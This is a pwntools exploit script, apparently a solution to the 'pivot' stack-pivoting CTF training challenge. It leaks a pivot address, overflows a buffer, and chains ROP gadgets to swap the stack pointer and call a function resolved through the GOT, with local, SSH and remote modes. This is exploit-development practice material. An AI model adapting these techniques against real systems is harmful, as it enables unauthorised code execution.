#!/usr/bin/python3

#!/usr/bin/python
# coding=utf-8
# __author__:TaQini

from pwn import *

local_file = './pivot'
local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc  # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
    elf = ELF(local_file)
elif len(sys.argv) > 1:
    is_remote = True
    if sys.argv[1] == 'ssh':
        username, host = sys.argv[2].split('@')
        port = int(sys.argv[3])
        password = sys.argv[4]
        sh = ssh(username, host, port, password)
        p = sh.process(local_file)
        #elf = ELF(local_file)
    else :
        #len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
        p = remote(host, port)
        libc = ELF(remote_libc)

    '''else:
        host, port = sys.argv[1].split(':')'''


#elf = ELF(local_file)

context.log_level = 'debug'
#context.arch = elf.arch


def se(data): return p.send(data)
def sa(delim, data): return p.sendafter(delim, data)
def sl(data): return p.sendline(data)


def sla(delim, data): return p.sendlineafter(delim, data)
def sea(delim, data): return p.sendafter(delim, data)
def rc(numb=4096): return p.recv(numb)
def ru(delims, drop=True): return p.recvuntil(delims, drop)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info_addr(tag, addr): return p.info(tag + ': {:#x}'.format(addr))


'''def debug(cmd=''):
    if is_local:
        attach(p, cmd)'''

# foothold
pltaddress=0x400720
gotaddress=0x601040

#gadget
#0x080484a9 : pop ebx ; ret
popret=0x080484a9
#0x08048492 : ret
ret=0x08048492
#0x080485fe : add byte ptr [eax], al ; ret
#addret=0x080485fe
#0x00000000004009bb : pop rax ; ret
#0x00000000004007c8 : pop rbp ; ret

#0x00000000004009c4 : add rax, rbp ; ret

poprax=0x00000000004009bb
poprbp=0x00000000004007c8
addret=0x00000000004009c4
#0x00000000004006b0 : call rax

callrax=0x00000000004006b0
#0x00000000004009c0 : mov rax, qword ptr [rax] ; ret

moveax=0x00000000004009c0
#0x00000000004009bd : xchg rax, rsp ; ret
xchg=0x00000000004009bd

#
text=p.recv()
print (text)
pivot = int(text.splitlines()[4].split()[-1], 16)
print ("[+] Pivot is " + hex(pivot))

# rop1s
offset = 32+8
payload = b'A'*offset
payload += p64(poprax)+p64(pivot)+p64(xchg)
payload1 =p64(pltaddress)#不用 +p32(ret)
payload1 +=p64(poprax)+p64(gotaddress)+p64(moveax)+p64(poprbp)+p64(0x117)+p64(addret)+p64(callrax)


# debug()
sl(payload1)
sl(payload)

p.interactive()

# system()地址 + 命令字符串地址
